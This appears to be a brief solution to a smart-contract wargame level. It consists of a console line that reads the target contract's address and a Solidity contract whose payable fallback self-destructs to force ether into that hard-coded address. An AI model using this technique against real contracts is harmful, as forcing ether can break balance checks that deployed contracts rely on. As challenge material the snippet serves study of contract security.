1. `await contract.address`

```
pragma solidity ^0.4.18;

contract SendMoney {
    address public targetAddr = 0x74676681388547e64147f20bdc29bfb7b403babc;

    function () public payable {
        selfdestruct(targetAddr);
    }
}
```